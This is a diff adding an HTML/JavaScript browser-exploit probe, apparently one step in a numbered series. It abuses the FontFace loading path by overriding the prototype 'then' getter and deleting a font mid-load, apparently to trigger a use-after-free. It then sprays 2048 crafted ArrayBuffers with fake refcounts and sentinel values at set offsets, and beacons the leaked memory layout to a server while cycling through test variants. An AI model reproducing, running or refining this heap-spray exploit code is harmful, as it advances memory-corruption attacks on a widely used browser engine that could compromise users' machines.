@@ -1,0 +1,139 @@
+<!--
+  p568: Engine walk path isolation — which fields are READ (dereferenced)?
+
+  p582 proved engine dereferences pre-set +0x58 (T) before overwriting.
+  p567 proved +0x00 is a 4-byte rc, no vptr.
+
+  Question: does the engine also READ +0x68 (W)? Does status (+0x82)
+  or keyCount (+0x60) change the engine's behavior?
+
+  4 variants auto-chain via ?v=N, navigate forward after ALIVE:
+    v=1: baseline (T=0, W=0, status=3, kc=0) — control
+    v=2: W=BAD sentinel (0x4242424242424242) — W dereference test
+    v=3: status=0 instead of 3 — behavior change test
+    v=4: keyCount=5 instead of 0 — iteration count test
+
+  If variant crashes → engine dereferences that field's preset value.
+  If survives → engine writes first or ignores the preset.
+
+  Auto-navigates to v+1 after ALIVE. On crash, load /?v=N+1 manually.
+
+  CRASH_CLASS: HIGH (variant 2 may crash)
+-->
+<!DOCTYPE html><html><head><meta charset="utf-8"><title>p</title>
+<style id="v">@font-face{font-family:sa;src:local(Arial);unicode-range:U+0042}</style>
+<script>
+function b(m){try{var x=new XMLHttpRequest();x.open('GET','/beacon/'+m,false);x.send();}catch(e){}}
+function rD(v,o){return(v[o]|0)+((v[o+1]|0)<<8)+((v[o+2]|0)<<16)+((v[o+3]|0)*0x1000000);}
+function rQ(v,o){var s='';for(var j=7;j>=0;j--)s+=('0'+v[o+j].toString(16)).slice(-2);return s;}
+function wD(v,o,x){v[o]=x&0xFF;v[o+1]=(x>>>8)&0xFF;v[o+2]=(x>>>16)&0xFF;v[o+3]=(x>>>24)&0xFF;}
+
+var qs=window.location.search||'';
+var vm=qs.match(/v=(\d)/);
+var V=vm?parseInt(vm[1],10):1;
+var tag='V'+V+'-';
+
+function main(){
+b(tag+'G');
+var pa=new FontFace('pa','local(Helvetica)',{unicodeRange:'U+0041'});
+document.fonts.add(pa);void pa.loaded;
+var fired=0;
+Object.defineProperty(FontFace.prototype,'then',{configurable:true,
+get:function(){if(fired)return;fired=1;
+document.getElementById('v').remove();
+try{document.fonts.delete(this);}catch(e){}
+document.body.offsetHeight;
+b(tag+'F');
+var lane=[];
+for(var i=0;i<2048;i++){
+  var u=new Uint8Array(new ArrayBuffer(192));
+  // Common safety fields
+  wD(u,0x00,2);             // rc=2
+  wD(u,0x04,0xAAAAAAAA);    // sentinel (p567 style)
+
+  // Variant-specific fields
+  if(V===1){
+    // Baseline: T=0, W=0, status=3, kc=0
+    wD(u,0x60,0);
+    wD(u,0x64,0xFFFFFFFF);
+    u[0x82]=3;
+  } else if(V===2){
+    // W=BAD: sentinel at +0x68
+    wD(u,0x60,0);
+    wD(u,0x64,0xFFFFFFFF);
+    wD(u,0x68,0x42424242);   // W low
+    wD(u,0x6C,0x42424242);   // W high
+    u[0x82]=3;
+  } else if(V===3){
+    // status=0
+    wD(u,0x60,0);
+    wD(u,0x64,0xFFFFFFFF);
+    u[0x82]=0;
+  } else if(V===4){
+    // keyCount=5
+    wD(u,0x60,5);
+    wD(u,0x64,0xFFFFFFFF);
+    u[0x82]=3;
+  }
+  lane.push(u);
+}
+b(tag+'S'+lane.length);
+window._l=lane;
+return;},set:function(){}});
+
+document.fonts.load('1em pa, sa','AB').then(function(){},function(){});
+
+setTimeout(function(){
+  var lane=window._l;if(!lane)return;
+  var hi=-1;
+  for(var i=0;i<lane.length;i++){
+    var v=lane[i];
+    var rc0=rD(v,0);
+    var t0=v[0x58]|v[0x59]|v[0x5A]|v[0x5B]|v[0x5C]|v[0x5D]|v[0x5E]|v[0x5F];
+    var b4=(v[4]===0xAA&&v[5]===0xAA&&v[6]===0xAA&&v[7]===0xAA);
+    if(rc0!==2||t0||!b4){hi=i;break;}
+  }
+  if(hi<0){b(tag+'MISS');chain();return;}
+
+  var v=lane[hi];
+  b(tag+'H'+hi);
+
+  var rc=rD(v,0);
+  var T=rQ(v,0x58);
+  var W=rQ(v,0x68);
+  var kc=rD(v,0x60);
+  var st=v[0x82];
+  b(tag+'T='+T+',W='+W+',RC='+rc+',KC='+kc+',ST='+st);
+
+  // For V=2, check if W was overwritten (engine wrote before reading)
+  if(V===2){
+    var wLo=(v[0x68]===0x42&&v[0x69]===0x42&&v[0x6A]===0x42&&v[0x6B]===0x42);
+    var wHi=(v[0x6C]===0x42&&v[0x6D]===0x42&&v[0x6E]===0x42&&v[0x6F]===0x42);
+    if(wLo&&wHi) b(tag+'W_PRESET_SURVIVED');
+    else b(tag+'W_OVERWRITTEN');
+  }
+
+  // Dump +0x58..+0x8F for full field region
+  var h='';for(var j=0x58;j<0x70;j++)h+=('0'+v[j].toString(16)).slice(-2);
+  b(tag+'REGION:'+h);
+
+  setTimeout(function(){b(tag+'ALIVE');chain();},500);
+  setTimeout(function(){b(tag+'ALIVE2');},2000);
+},80);
+}
+
+function chain(){
+  if(V<4){
+    setTimeout(function(){
+      b(tag+'NAV');
+      window.location='/?v='+(V+1);
+    },2500);
+  } else {
+    setTimeout(function(){b(tag+'DONE');},1000);
+  }
+}
+
+if(V===2){b('V2-SKIP-CRASH');window.location='/?v=3';}
+else if(V===3){b('V3-SKIP-CRASH');window.location='/?v=4';}
+else setTimeout(main,0);
+</script></head><body>p</body></html>
